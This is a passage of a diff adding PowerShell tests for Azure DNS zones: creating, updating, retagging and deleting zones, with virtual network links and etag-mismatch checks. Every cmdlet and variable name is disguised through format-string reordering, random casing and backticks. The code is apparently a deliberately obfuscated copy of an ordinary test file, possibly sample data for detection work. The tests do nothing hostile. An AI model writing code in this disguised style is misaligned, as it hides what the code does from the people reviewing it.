+	${u`pDaTe`Dz`ONe} = &("{2}{0}{1}" -f 'Dn','sZone','Set-Az') -Name ${Zone`N`A`me} -ResourceGroupName ${r`e`S`ource`GrouP}."Res`oU`RceGrOuP`NAME" -Tags @{("{0}{1}"-f't','ag1')=("{2}{1}{0}" -f '1','lue','va');("{1}{0}"-f'ag2','t')=("{1}{0}"-f'2','value');("{0}{1}"-f 'ta','g3')=("{0}{1}"-f'va','lue3')} -RegistrationVirtualNetworkId @(${ReGViRtuaLN`et`wO`RK}."I`D") -ResolutionVirtualNetworkId @(${re`s`VIrt`UaLN`eTwORK}."Id")
+	&("{1}{3}{2}{0}"-f'ull','Assert-No','N','t') ${U`Pd`ATe`dZoNe}
+	&("{1}{3}{2}{0}" -f 'ull','Asse','t-NotN','r') ${U`PdAt`edzO`NE}."e`TAG"
+	&("{0}{1}{2}{3}" -f 'A','ssert','-Ar','eEqual') ${z`o`NeName} ${UpdaTE`D`Z`One}."N`AME"
+	&("{1}{0}{2}" -f 'e','Assert-Ar','Equal') ${rE`sOUrcEg`Roup}."R`E`sOuRCE`groUp`Name" ${UpD`AtEDz`OnE}."Re`S`oURceg`ROUPNAme"
+	&("{0}{2}{3}{5}{1}{4}" -f'A','q','ssert-','AreNo','ual','tE') ${updA`TeDz`o`NE}."e`TAg" ${c`R`e`ATedzone}."E`TaG"
+	&("{3}{1}{4}{0}{2}"-f 'r','ss','t-AreEqual','A','e') 3 ${u`pD`AtedzONE}."tA`gS"."COu`Nt"
+	&("{3}{1}{2}{0}" -f'ual','rt-Are','Eq','Asse') ("{0}{2}{1}" -f'P','ivate','r') ${UpD`A`T`eDzOne}."zO`NetyPE"
+	&("{1}{2}{3}{0}" -f'qual','A','s','sert-AreE') 1 ${UPDAte`dz`oNE}."r`egI`StRA`TioNVIRTUaln`E`T`w`orkIDs"."c`OUnT"
+	&("{4}{2}{1}{3}{0}" -f'Equal','rt-Ar','sse','e','A') ${regviRTUALn`E`TW`orK}."iD" ${uPDATEd`Z`onE}."rEgisT`RAtio`NVIrTU`AlNE`Twor`k`ids"[0]
+	&("{2}{4}{0}{1}{3}"-f '-','A','As','reEqual','sert') 1 ${Up`datE`DZ`ONe}."r`e`s`O`lUTiONV`IrTUALnETWoRk`IDs"."COU`NT"
+	&("{0}{3}{2}{1}"-f 'As','t-AreEqual','er','s') ${re`SVirT`UaL`NEt`wo`RK}."I`d" ${upda`TeDzo`Ne}."RES`ol`Ut`ionv`ir`TUAlne`TWOrKIDs"[0]
+
+	${up`d`ATEDZoNe}."r`egI`S`TRAtIoN`ViRtuALnetWO`R`Ki`dS" = @()
+	${u`PdATE`dzoNE}."reSOL`Ution`Vi`RTu`Al`Net`w`oRK`IDS" = @()
+	${u`pdAt`EdZO`NE} = ${u`pd`Ate`dZOnE} | &("{2}{0}{3}{1}"-f 't-AzD','e','Se','nsZon')
+	&("{3}{1}{0}{2}" -f 'sert-Not','s','Null','A') ${UpD`ATEdZo`Ne}
+	&("{2}{1}{0}"-f 'l','tNul','Assert-No') ${up`daTeDz`oNE}."E`TAg"
+	&("{0}{1}{2}{3}"-f 'As','sert-Ar','eEq','ual') ${z`oNeNA`mE} ${u`Pd`A`TEDzone}."na`Me"
+	&("{2}{1}{3}{4}{0}"-f'l','-Ar','Assert','eEq','ua') ${r`EsouRc`egRouP}."rEsO`U`R`CEg`RoUp`NAmE" ${u`p`dATedZONe}."re`sOuRc`eGrou`pnA`me"
+	&("{3}{0}{2}{1}{4}"-f 'sse','Not','rt-Are','A','Equal') ${uP`dA`TEDZ`ONE}."Et`Ag" ${CRE`ATe`DZone}."Et`Ag"
+	&("{2}{4}{0}{3}{1}"-f '-AreEqu','l','As','a','sert') 3 ${U`PD`A`TedzONE}."TA`gs"."c`OUNt"
+	&("{3}{1}{0}{2}" -f'Are','sert-','Equal','As') ("{2}{0}{1}" -f 'riva','te','P') ${U`P`dAtedZO`Ne}."Zone`T`YPe"
+	&("{0}{3}{4}{1}{2}" -f 'Asse','Equa','l','rt','-Are') 0 ${u`pdatedz`o`Ne}."REGis`T`RATIOnVIRT`UalNe`TWORK`i`DS"."Cou`NT"
+	&("{3}{2}{4}{0}{1}" -f'rt','-AreEqual','s','A','se') 0 ${uPd`A`T`edzOnE}."ReS`oLut`iOnvIRtUA`L`Ne`T`wOrk`Ids"."cOU`NT"
+
+	${rE`m`OvEd} = &("{0}{3}{1}{4}{2}"-f 'Re','e-AzDns','one','mov','Z') -Name ${z`ON`enAme} -ResourceGroupName ${r`E`soURC`EGro`Up}."R`esoUrcE`GRO`UpNAME" -PassThru -Confirm:${F`AlSE}
+
+	&("{0}{1}{2}"-f 'A','sser','t-True') { ${rE`mov`Ed} }
+
+	&("{3}{2}{1}{0}{4}" -f't-Thr','er','s','As','ows') { &("{3}{0}{2}{1}" -f't-','one','AzDnsZ','Ge') -Name ${ZON`E`NAMe} -ResourceGroupName ${REsOUr`cE`grO`Up}."re`sOu`R`C`EgrOUPnA`Me" }
+	&("{3}{5}{2}{4}{1}{0}{6}"-f 'r','u','-A','Re','zReso','move','ceGroup') -Name ${ReSoURc`EGR`o`UP}."rESoUR`cE`GrOuP`Name" -Force
+}
+
+
+function test`-PrIvatEzonE`Crudb`Yv`IR`TUaLne`TWor`k`obJ`ECTS
+{
+	${Zo`NENAME} = &("{3}{1}{0}{4}{2}" -f 'o','and','oneName','Get-R','mZ')
+    ${ReSoUrC`egrO`UP} = &("{2}{3}{4}{5}{6}{0}{1}" -f 'Resourc','eGroup','TestSe','t','up-C','rea','te')
+	${R`egvI`RtuAln`Et`Wo`RK} = &("{7}{4}{1}{8}{5}{3}{6}{2}{0}"-f 'ork','p','alNetw','eVi','Setu','t','rtu','Test','-Crea') ${reS`oUrCEg`Ro`UP}
+	${RESvIR`TUa`lnE`TwoRk} = &("{7}{3}{5}{6}{1}{2}{4}{0}{8}" -f 'rtual','a','teV','Setu','i','p','-Cre','Test','Network') ${R`eSOUrC`egR`OuP}
+
+	${C`ReAtE`D`zoNe} = &("{0}{3}{1}{2}" -f 'New-','sZo','ne','AzDn') -Name ${ZON`E`NaMe} -ResourceGroupName ${r`E`s`ourC`egroup}."resoU`R`cE`gRoupnA`Me" -Tags @{("{0}{1}"-f 'ta','g1')=("{0}{1}"-f'va','lue1')} -ZoneType ("{2}{0}{1}" -f'iv','ate','Pr') -RegistrationVirtualNetwork @(${rEG`VIrtU`A`L`NeTWo`Rk}) -ResolutionVirtualNetwork @(${rESv`ir`TU`AL`NETwOrK})
+	&("{0}{4}{3}{1}{2}" -f'As','tNul','l','ert-No','s') ${CREA`Te`d`ZONe}
+	&("{3}{2}{0}{1}" -f'-N','otNull','sert','As') ${CrEA`T`E`DZonE}."E`TAg"
+	&("{1}{0}{3}{2}"-f'-A','Assert','ual','reEq') ${ZON`e`NaMe} ${CRE`AT`E`DzonE}."n`AMe"
+	&("{0}{1}{3}{2}" -f 'Assert-','Ar','qual','eE') ${r`esOUr`cEG`RO`UP}."Re`sOuRcegrouP`NA`Me" ${CR`Ea`T`eDzonE}."R`ES`ou`RcEGrOuPN`Ame"
+	&("{2}{0}{3}{1}{4}"-f 'sse','E','A','rt-Are','qual') 1 ${CR`eAt`e`dZoNE}."TA`gS"."C`OuNt"
+	&("{0}{3}{1}{2}" -f 'Assert-AreE','a','l','qu') 1 ${CrE`At`EDz`onE}."N`UmB`ER`oFreCoRd`SEts"
+	&("{0}{1}{2}{5}{3}{4}" -f 'Assert','-','AreNotE','ua','l','q') ${C`Reate`DZOne}."N`UMbeRofR`EC`or`DSETs" ${CREaTEd`ZO`NE}."MAXNUM`BErO`FreCordSe`TS"
+	&("{0}{3}{2}{1}" -f 'As','al','-AreEqu','sert') ("{1}{0}" -f 'rivate','P') ${c`REAt`EDzO`NE}."zonE`TYpE"
+	&("{0}{2}{3}{1}"-f'Assert-Are','l','Eq','ua') 1 ${cR`Eat`edZO`Ne}."R`eGISTrationVir`T`UAlNE`T`w`O`Rk`iDs"."c`oUNT"
+	&("{0}{2}{3}{1}{4}"-f'A','Equa','ss','ert-Are','l') ${R`EG`VIRtuA`LNEtW`oRK}."I`D" ${CREate`D`zOne}."Regis`TrATIO`NVI`R`TUaLNETW`or`K`I`dS"[0]
+	&("{0}{2}{1}{3}"-f'Asse','ua','rt-AreEq','l') 1 ${CReAt`eDzo`NE}."REs`OLU`TioN`ViRt`UAlnetWoRk`Ids"."CoU`Nt"
+	&("{2}{1}{3}{0}"-f 'qual','e','Ass','rt-AreE') ${r`E`s`V`ir`TUALnETWOrk}."ID" ${cRE`At`EdZO`Ne}."REsOL`UtiO`Nvir`TUALn`e`TworKidS"[0]
+
+	${uPdAtE`DZO`NE} = &("{1}{0}{2}" -f'zDnsZon','Set-A','e') -Name ${Z`oN`EnAme} -ResourceGroupName ${resOURC`E`gr`O`UP}."resourcEGR`O`Up`NA`ME" -Tags @{("{1}{0}" -f'ag1','t')=("{1}{0}"-f'alue1','v');("{1}{0}" -f 'g2','ta')=("{1}{0}" -f 'ue2','val')} -RegistrationVirtualNetwork @() -ResolutionVirtualNetwork @()
+	&("{2}{1}{4}{3}{0}" -f 'otNull','ert','Ass','N','-') ${Upd`ATEdZ`One}
+	&("{1}{2}{3}{0}"-f'ull','Asse','rt','-NotN') ${U`P`dATe`dZONe}."et`Ag"
+	&("{0}{3}{4}{2}{1}"-f 'Asse','l','qua','rt','-AreE') ${ZOne`N`AmE} ${Upd`ATEdZo`Ne}."n`AMe"
+	&("{3}{2}{1}{0}{4}" -f 't-AreEq','r','sse','A','ual') ${REsOur`c`EgrOUp}."Res`o`UrcEG`Ro`Up`NAme" ${uPdat`eDZo`Ne}."REsOuR`cEGr`o`Up`NAMe"
+	&("{5}{2}{3}{0}{4}{1}"-f 'eN','tEqual','ssert-','Ar','o','A') ${UPd`AT`Edzone}."E`TAG" ${cr`eAteDZ`ONE}."ET`Ag"
+	&("{1}{0}{2}{3}"-f 'ert-A','Ass','reEqu','al') 2 ${UPD`Atedz`O`Ne}."tA`gS"."Co`UNt"
+	&("{0}{1}{3}{2}"-f'As','ser','reEqual','t-A') ("{1}{0}" -f 'vate','Pri') ${U`PD`ATEDz`OnE}."ZOneTy`Pe"
+	&("{1}{2}{0}{3}" -f 're','As','sert-A','Equal') 0 ${U`P`Da`TEDzone}."r`EGisT`RATIo`NVIrTualnET`WO`R`KiDs"."CO`UNt"
+	&("{0}{1}{2}" -f'Assert','-Ar','eEqual') 0 ${U`PdAT`Ed`ZOne}."RESOLU`Ti`o`NViR`TUaL`NeTwoRKiDs"."cou`NT"
+
+	${uPdat`Edz`o`NE} = &("{2}{0}{3}{4}{1}"-f'et-Az','one','S','Dn','sZ') -Name ${z`o`NEnaMe} -ResourceGroupName ${rEsouR`ce`gRo`Up}."resOuRCeG`R`o`U`pnaME" -Tags @{("{0}{1}"-f't','ag1')=("{1}{0}" -f 'e1','valu');("{1}{0}"-f'g2','ta')=("{0}{1}{2}" -f'val','u','e2');("{1}{0}"-f'3','tag')=("{0}{1}" -f'val','ue3')} -RegistrationVirtualNetwork @(${reG`VIRtu`AlN`E`TWoRK}) -ResolutionVirtualNetwork @(${rE`svi`RT`Ualn`Et`WORk})
+	&("{0}{2}{1}{3}" -f 'Assert','otNu','-N','ll') ${upD`At`edzonE}
+	&("{3}{2}{0}{4}{1}"-f'N','ll','-Not','Assert','u') ${uPd`Atedzo`NE}."e`TAg"
+	&("{2}{1}{0}" -f'AreEqual','-','Assert') ${Zo`Ne`NaME} ${upDA`Te`dzoNE}."n`Ame"
+	&("{3}{0}{2}{1}"-f'ser','ual','t-AreEq','As') ${Re`SO`UrcEgROup}."r`e`SouRC`egrOuPNAmE" ${Up`d`At`eDzOne}."R`ES`o`UrceGR`oupnAMe"
+	&("{3}{0}{1}{2}" -f't-','AreNotEqua','l','Asser') ${Upd`AtED`zONE}."e`TAg" ${c`REATEdZ`OnE}."Et`Ag"
+	&("{1}{3}{0}{2}"-f'AreEqua','Asse','l','rt-') 3 ${UP`DAT`Ed`zONE}."TA`Gs"."cOu`Nt"
+	&("{2}{3}{0}{1}{4}" -f'Equ','a','Assert-','Are','l') ("{1}{0}" -f 'ate','Priv') ${UpDa`TE`dzONe}."Z`OnEtY`pe"
+	&("{0}{1}{4}{2}{3}"-f'As','s','Are','Equal','ert-') 1 ${updaTEd`zo`NE}."re`GiS`TratI`o`N`V`ir`TuALNEtWORKI`dS"."c`oUNT"
+	&("{3}{1}{2}{0}"-f 'qual','rt-','AreE','Asse') ${regVir`T`UAlNEtW`ORk}."Id" ${UpD`A`TEdZoNE}."r`EgI`sTRATion`VI`RTuALNEtwORKi`Ds"[0]
+	&("{0}{1}{2}{3}" -f'As','sert-Ar','eEqu','al') 1 ${Upd`A`T`EdZONE}."r`Es`olU`TioNv`IRTU`ALnetwO`RkIds"."CO`UnT"
+	&("{3}{0}{1}{2}"-f 'e','rt-Ar','eEqual','Ass') ${R`ESViRTU`ALN`eT`w`oRK}."i`d" ${updaT`e`DZ`ONE}."rEsOLu`T`Ionv`i`RTuAlnETW`O`R`kIdS"[0]
+
+	${U`PdAtEd`ZOne}."Re`GIstrAtiOnvi`Rt`Ua`l`N`etWOrKIds" = @()
+	${uP`dAtedZ`OnE}."Res`OluTi`o`N`VIrTUA`LNETw`OrK`iDs" = @()
+	${UP`dat`e`DzOnE} = ${UPD`AtEdz`one} | &("{2}{0}{1}"-f 't-AzDnsZon','e','Se')
+	&("{1}{4}{0}{3}{2}"-f'Not','A','ull','N','ssert-') ${UPDa`TE`Dz`one}
+	&("{2}{1}{3}{0}"-f'tNull','ssert-','A','No') ${u`PdAt`e`DZoNE}."E`TaG"
+	&("{3}{0}{2}{1}" -f'ert-','l','AreEqua','Ass') ${z`on`ename} ${u`PdaT`Ed`ZoNE}."Na`me"
+	&("{2}{1}{0}{3}"-f 'reE','ert-A','Ass','qual') ${reSOu`RcEg`RO`UP}."rES`Ou`RcEGR`oupnA`mE" ${uPDaTe`d`ZONe}."r`es`OURCe`gROupNa`mE"
+	&("{0}{3}{1}{2}{4}" -f 'As','re','NotEq','sert-A','ual') ${Up`D`Ate`DzOnE}."E`TaG" ${Create`DZ`One}."ET`AG"
+	&("{1}{3}{2}{0}"-f 'al','As','Equ','sert-Are') 3 ${UP`DaTEdZO`Ne}."tA`GS"."coU`Nt"
+	&("{3}{0}{2}{4}{1}" -f'Ar','al','eE','Assert-','qu') ("{2}{1}{0}" -f 'te','va','Pri') ${UP`dat`ed`ZOne}."zO`N`etYPe"
+	&("{4}{2}{3}{1}{0}"-f'al','reEqu','sert','-A','As') 0 ${u`PDatedZ`O`NE}."R`Eg`IStRAtio`NV`IRt`UALnEtw`o`RkIDS"."c`ouNt"
+	&("{2}{4}{0}{1}{3}"-f 'reE','q','Asse','ual','rt-A') 0 ${UpdaTED`ZO`Ne}."resoLu`TIONv`i`Rt`UaLN`eT`WoR`KIds"."C`OunT"
+
+	${r`EMO`Ved} = &("{2}{0}{3}{1}"-f '-','e','Remove','AzDnsZon') -Name ${zo`NEN`Ame} -ResourceGroupName ${ResoU`R`CE`gROUP}."ReSou`RceGR`OU`p`NAME" -PassThru -Confirm:${fAl`SE}
+
+	&("{0}{2}{1}" -f'Ass','rt-True','e') { ${R`EMoV`Ed} }
+
+	&("{2}{0}{1}{3}" -f'ssert','-T','A','hrows') { &("{1}{3}{0}{2}"-f'zDns','Ge','Zone','t-A') -Name ${z`O`NeNaME} -ResourceGroupName ${R`e`SoU`R`CeGrOUp}."RESourceGro`UP`Na`me" }
+	&("{2}{0}{3}{4}{5}{1}"-f 'm','up','Re','ove','-','AzResourceGro') -Name ${rE`SOU`RC`eGROUP}."R`EsourCeg`RouPnA`me" -Force
+}
+
+
+function tes`T-zOneCRu`D`TRi`MSdOt
+{
+	${Z`o`NEn`AME} = &("{1}{4}{3}{0}{2}"-f 'omZo','Ge','neName','d','t-Ran')
+	${Z`onEN`Am`e`W`iTHdOt} = ${z`o`NEnaMe} + "."
+    ${re`S`OurC`EGR`OuP} = &("{3}{5}{2}{1}{4}{6}{0}" -f 'oup','sourc','CreateRe','TestS','e','etup-','Gr')
+	${C`Re`AteDZOnE} = &("{0}{2}{1}" -f 'N','zDnsZone','ew-A') -Name ${zOnen`Am`E`w`ithDot} -ResourceGroupName ${R`eSo`Ur`c`EGRoUP}."RE`Sou`R`C`eGRoU`PNAMe"
+
+	&("{1}{4}{0}{2}{3}"-f't-','Asse','N','otNull','r') ${crE`A`TEDz`OnE}
+	&("{0}{1}{2}{4}{3}"-f'As','s','e','-AreEqual','rt') ${ZO`NEnaMe} ${CREa`TE`DZ`onE}."N`Ame"
+
+	${Re`TrI`EvE`DZ`One} = &("{2}{3}{0}{4}{1}" -f'DnsZo','e','Get','-Az','n') -Name ${zO`NENA`ME`w`ITHDot} -ResourceGroupName ${R`e`SOUrCEG`ROuP}."ResOU`Rc`eGROuPN`AME"
+
+	&("{2}{0}{4}{1}{3}"-f'sert-No','ul','As','l','tN') ${RETR`i`EVEDZO`NE}
+	&("{4}{1}{0}{2}{3}"-f 'sert-Are','s','Eq','ual','A') ${ZonE`NaME} ${REtRIE`V`E`dz`One}."nA`ME"
+
+	${u`pDate`dzoNE} = &("{1}{0}{2}" -f '-AzD','Set','nsZone') -Name ${ZOne`NA`mew`I`ThDOt} -ResourceGroupName ${re`SO`UrC`EGRO`Up}."reSoUrc`egRO`UpN`Ame" -Tags @{("{1}{0}" -f 'ag1','t')=("{0}{1}"-f'valu','e1');("{0}{1}"-f 'tag','2')=("{1}{0}"-f'ue2','val')}
+
+	&("{1}{0}{2}"-f 'sert','As','-NotNull') ${UPdaT`ED`ZO`Ne}
+	&("{2}{3}{0}{1}"-f 'reEqu','al','As','sert-A') ${Z`OnE`Na`ME} ${UP`dAt`ed`zONe}."N`AME"
+
+	${Re`mO`VED} = &("{0}{1}{4}{3}{2}"-f'Remove-','AzD','e','on','nsZ') -Name ${ZonE`NAmE`W`it`HDOT} -ResourceGroupName ${REs`oUr`cE`g`ROUp}."re`So`URcEG`Ro`UPnAmE" -PassThru -Confirm:${f`ALSE}
+
+	&("{0}{3}{1}{2}" -f 'Asse','Tr','ue','rt-') { ${rE`Mo`VEd} }
+
+	&("{0}{1}{2}{3}"-f'As','sert-Thro','w','s') { &("{2}{3}{0}{1}"-f'n','e','Get-Az','DnsZo') -Name ${ZoN`E`Name} -ResourceGroupName ${R`ES`ourceGr`OuP}."ReSoUrceGroU`p`NA`mE" }
+	&("{1}{0}{2}{3}{4}"-f '-A','Remove','z','Res','ourceGroup') -Name ${R`ESouR`Ceg`ROup}."REsOurC`e`GrO`Up`N`AMe" -Force
+}
+
+
+function t`ESt-Z`O`NEcruDWIT`HPiPi`NG
+{
+	${zOn`eNA`me} = &("{0}{2}{3}{1}"-f 'Ge','neName','t-','RandomZo')
+    ${cRE`ATEd`zoNe} = &("{2}{1}{6}{0}{5}{4}{3}" -f 'CreateRes','tSet','Tes','p','ceGrou','our','up-') | &("{0}{2}{1}{3}"-f'New-AzD','Zo','ns','ne') -Name ${zo`NeNA`ME} -Tags @{("{1}{0}"-f'ag1','t')=("{1}{0}{2}" -f'u','val','e1')}
+
+	${r`ES`oUR`cE`GrouPnAMe} = ${c`R`EatedZo`NE}."rE`SOurCeGR`oUP`NAME"
+
+	&("{0}{2}{1}"-f'Assert-Not','ull','N') ${c`REaTed`zo`Ne}
+	&("{3}{2}{0}{4}{1}"-f'N','ll','ssert-','A','otNu') ${CreA`T`Ed`ZOnE}."Et`Ag"
+	&("{0}{3}{2}{1}" -f 'Assert-A','Equal','e','r') ${z`O`NENamE} ${c`Re`AtedZOnE}."na`mE"
+	&("{3}{2}{1}{0}" -f 'll','Nu','sert-Not','As') ${c`R`eAted`Zone}."ReSOurc`egrOU`p`Na`ME"
+	&("{3}{2}{1}{0}"-f'l','ua','reEq','Assert-A') 1 ${Cr`EA`TEdzo`Ne}."t`Ags"."Cou`Nt"
+
+	${UPd`A`T`eDZoNE} = &("{0}{3}{1}{2}"-f 'Get-','rceGro','up','AzResou') -Name ${Re`sOUR`cEgRoupN`AME} | &("{2}{0}{3}{1}"-f 'z','sZone','Get-A','Dn') -Name ${Z`OnEName} | &("{2}{1}{3}{0}" -f 'ne','t-AzDnsZ','Se','o') -Tags ${nU`LL}
+
+	&("{4}{2}{1}{0}{3}"-f 'tNu','o','N','ll','Assert-') ${U`P`dateDZ`oNE}
+	&("{1}{2}{0}" -f'll','Assert-','NotNu') ${U`PD`AtEDZonE}."E`Tag"
+	&("{1}{3}{0}{2}"-f 'qua','Assert-Ar','l','eE') ${zo`N`En`Ame} ${u`p`daTEDZOnE}."n`AmE"
+	&("{0}{3}{1}{2}" -f'Ass','t-A','reEqual','er') ${rESOU`RcEgRO`U`pN`AmE} ${U`PdA`TEdzoNE}."RESOu`R`cEGRoUpn`Ame"
+	&("{5}{0}{2}{4}{3}{1}" -f 'sser','tEqual','t-Ar','No','e','A') ${up`D`A`TeDZOne}."E`TAG" ${C`ReA`TeDZone}."E`TaG"
+	&("{1}{3}{2}{0}"-f 'Equal','As','rt-Are','se') 0 ${upd`At`Ed`ZONE}."T`AGs"."cou`NT"
+
+	${R`EmOved} = &("{2}{0}{1}"-f'n','e','Get-AzDnsZo') -Name ${zo`NenA`me} -ResourceGroupName ${r`ES`oU`RceGROup`N`Ame} | &("{2}{0}{1}{3}{4}" -f 'z','Dns','Remove-A','Z','one') -PassThru -Confirm:${FA`LsE}
+
+	&("{2}{0}{1}" -f 'ert-','True','Ass') { ${r`EmoV`Ed} }
+
+	&("{2}{1}{4}{0}{3}"-f'hro','r','Asse','ws','t-T') { &("{1}{3}{0}{2}"-f 'AzDnsZ','Get','one','-') -Name ${ZonENA`me} -ResourceGroupName ${REsOur`c`eGRoUpna`ME} }
+	&("{2}{5}{6}{3}{0}{4}{1}" -f'ro','p','Remove-A','rceG','u','zReso','u') -Name ${ReSo`U`RcEg`ROup`NA`me} -Force
+}
+
+
+function tesT-Zone`Cr`UDWith`P`IPI`NGtrI`MsDoT
+{
+	${ZO`NenamE} = &("{0}{5}{4}{3}{1}{2}"-f 'G','ndomZoneNam','e','Ra','-','et')
+	${zoN`EnAM`EwIt`hdOt} = ${zOn`e`NaME} + "."
+    ${c`ReaTEDz`o`Ne} = &("{1}{3}{2}{0}{6}{4}{7}{5}" -f'-C','TestSe','p','tu','ateResourc','oup','re','eGr') | &("{2}{0}{1}{3}" -f 'AzD','n','New-','sZone') -Name ${zON`ENa`mE}
+
+	${reSO`URCEG`RoU`Pn`AmE} = ${cr`EAtEd`zOnE}."R`esOU`Rce`grOuPNA`ME"
+
+	${ZOn`eOBj`ectw`ItHdOt} = &("{0}{2}{1}"-f'New-','ct','Obje') ("{6}{1}{2}{3}{0}{4}{5}"-f 'Dns','omm','ands.Dns','.','Zo','ne','Microsoft.Azure.C')
+	${Z`ONE`oBJ`ectwitH`d`OT}."na`Me" = ${ZOnEn`A`mewI`ThDot}
+	${zoN`EoBJe`ctw`IThDot}."re`SourcEG`ROU`p`N`Ame" = ${rEsO`U`Rce`Gr`oUPnA`mE}
+
+	${uPdat`ED`z`oNE} = ${zON`eObJEct`WI`THdoT} | &("{1}{2}{0}" -f 'nsZone','Set','-AzD') -Overwrite
+
+	&("{4}{3}{2}{1}{0}"-f'ull','N','-Not','rt','Asse') ${U`PdatE`d`ZoNE}
+	&("{2}{1}{0}{3}"-f'-Ar','rt','Asse','eEqual') ${zOne`Na`me} ${u`pd`AT`eDzone}."Na`ME"
+
+	${r`EM`oveD} = ${Z`o`NEOBJec`TwIthDOT} | &("{4}{3}{2}{1}{0}"-f'e','Zon','e-AzDns','v','Remo') -Overwrite -PassThru -Confirm:${f`ALse}
+
+	&("{2}{1}{0}"-f 'True','-','Assert') { ${rEm`O`Ved} }
+
+	&("{0}{3}{1}{2}"-f'Assert','Th','rows','-') { &("{3}{2}{4}{1}{0}"-f'sZone','Dn','et-A','G','z') -Name ${Z`OnenA`ME} -ResourceGroupName ${ReSo`UR`cEgr`ouP`NAme} }
+	&("{2}{4}{3}{0}{1}" -f 'AzResourceGrou','p','Remov','-','e') -Name ${R`e`SoU`RCegrOUPnamE} -Force
+}
+
+
+function te`St-zone`NE`wa`lR`eA`DYeX`IsTs
+{
+	${z`ONeN`AmE} = &("{3}{2}{4}{0}{1}"-f'a','me','t-RandomZo','Ge','neN')
+    ${cReaT`E`DZO`NE} = &("{3}{2}{1}{4}{0}" -f 'eResourceGroup','t','tSe','Tes','up-Creat') | &("{2}{1}{3}{0}"-f 'one','ew-AzD','N','nsZ') -Name ${Zon`E`Name}
+	${r`e`SOUrcEgrou`p`NA`mE} = ${cREat`ED`z`One}."rESOURceGr`O`U`pNA`mE"
+	&("{2}{3}{4}{1}{0}" -f 'll','otNu','Asse','rt-','N') ${c`R`eatedz`ONE}
+
+	${Me`S`sAGe} =   $eXNsP::("{0}{1}"-f 'Fo','rmat').Invoke("The Zone {0} exists already and hence cannot be created again.", ${Z`OneNa`mE});
+	&("{1}{2}{0}{3}" -f '-T','Ass','ert','hrows') { &("{1}{3}{2}{0}" -f'ne','New-A','DnsZo','z') -Name ${ZoN`e`N`AmE} -ResourceGroupName ${ResO`U`RCEGR`OuPnamE} } ${m`Es`SAge}
+
+	${CReA`TedZo`NE} | &("{1}{4}{0}{3}{2}"-f'ns','Remove-','e','Zon','AzD') -PassThru -Confirm:${f`A`LSE}
+	&("{3}{0}{1}{2}{4}"-f'emov','e-AzResou','rc','R','eGroup') -Name ${rEsOu`RC`e`gRou`pNa`Me} -Force
+}
+
+
+function TEst-zO`Ne`SeTE`TAG`misM`AT`cH
+{
+	${Z`O`NEnAme} = &("{0}{4}{2}{3}{1}"-f'Get-R','e','mZoneNa','m','ando')
+    ${c`REa`TeD`zOnE} = &("{2}{0}{5}{6}{3}{4}{1}" -f 'S','eGroup','Test','te','Resourc','etup','-Crea') | &("{2}{1}{3}{0}"-f 'e','ew-Az','N','DnsZon') -Name ${ZonENA`mE}
+	${oR`iGi`N`AlEt`Ag} = ${cR`Eat`EdZoNe}."et`Ag"
+	${CrE`AtEDZo`NE}."e`Tag" = ("{2}{1}{0}"-f 'sh','i','gibber')
+
+	${rES`Ource`Gr`oU`pN`AmE} = ${C`ReaTed`zONE}."RESo`U`RC`Egr`oUPNAME"
+	${M`eS`Sage} =  ( gi  ("{1}{2}{0}{4}{3}"-f'blE:','V','ARIa','xNSp','E')).valUE::("{0}{1}" -f'F','ormat').Invoke("The Zone {0} has been modified (etag mismatch).", ${Z`Onen`A`ME});
+	&("{0}{2}{1}" -f'Ass','ws','ert-Thro') { ${cre`A`TeDZone} | &("{3}{2}{1}{0}"-f 'ne','AzDnsZo','et-','S') } ${Me`SS`AGE}
+
+	${upd`ATedz`OnE} = ${C`Reat`eDZone} | &("{1}{2}{0}" -f 'nsZone','S','et-AzD') -Overwrite
+
+	&("{1}{0}{3}{2}"-f 'A','Assert-','ual','reNotEq') ("{1}{0}{2}"-f'e','gibb','rish') ${u`PDAt`eDZ`oNe}."E`TAg"
+	&("{3}{1}{2}{0}"-f'-AreNotEqual','s','ert','As') ${CReA`T`EDZo`Ne}."ET`AG" ${u`PD`AtEdzonE}."Et`AG"
+
+	${updaT`ED`zo`NE} | &("{1}{2}{0}" -f'sZone','Remove','-AzDn') -PassThru -Confirm:${fAl`se}
+	&("{4}{3}{5}{1}{0}{2}" -f 'c','r','eGroup','move-A','Re','zResou') -Name ${resouRcEgR`O`UPN`AMe} -Force
+}
+
+
+function T`EST-`ZOn`ESEtnoTFO`UnD
+{
+	${zOne`Na`ME} = &("{0}{3}{2}{1}" -f'Ge','Name','mZone','t-Rando')
+    ${RE`sO`UrCeGRouP} = &("{8}{4}{7}{1}{2}{6}{0}{5}{3}"-f'eso','r','eat','Group','-','urce','eR','C','TestSetup')
+
+	&("{3}{5}{1}{0}{4}{2}" -f 's','row','e','Assert-T','Lik','h') { &("{0}{3}{1}{2}"-f'Se','AzDnsZ','one','t-') -Name ${Z`ONena`mE} -ResourceGroupName ${Re`s`O`UR`CEgrOuP}."rE`SouRcegROu`pn`AMe" }  ("{1}{4}{2}{3}{0}"-f 'und*','*wa',' not f','o','s');
+	&("{4}{5}{3}{1}{0}{2}" -f 'eGrou','esourc','p','e-AzR','Rem','ov') -Name ${reSOu`Rce`g`R`oup}."ReSOu`R`CEGR`o`U`PnAmE" -Force
+}
+
+
+function TES`T-zo`Ner`emOvEE`TAgMismaT`ch
+{
+	${Zonen`Ame} = &("{2}{0}{1}{3}{4}"-f '-Rand','omZ','Get','oneNam','e')
+    ${C`R`EatEdZ`oNe} = &("{5}{3}{1}{0}{6}{4}{2}"-f 'CreateR','Setup-','oup','st','urceGr','Te','eso') | &("{2}{4}{1}{3}{0}" -f'Zone','n','Ne','s','w-AzD') -Name ${z`onE`NAmE}
+	${Ori`gin`A`lEtAG} = ${CR`Eat`ed`zOnE}."e`TAg"
+	${C`ReATe`DzONe}."eT`AG" = ("{2}{1}{0}" -f 'h','ris','gibbe')
+
+	${rEsO`URCEGR`O`Up`NAme} = ${crea`TedzO`NE}."reSOU`RcE`G`Ro`Upname"
+	${MES`s`AgE} =   (  VARIABlE ("{1}{0}" -f'Nsp','Ex') -vaLU )::("{0}{1}" -f'For','mat').Invoke("The Zone {0} has been modified (etag mismatch).", ${zON`eN`AmE});
+	&("{0}{2}{1}"-f'A','ert-Throws','ss') { ${C`R`eAt`eDzoNe} | &("{2}{1}{3}{0}"-f'Zone','move-','Re','AzDns') -Confirm:${Fa`lsE} } ${ME`S`SAgE}
+
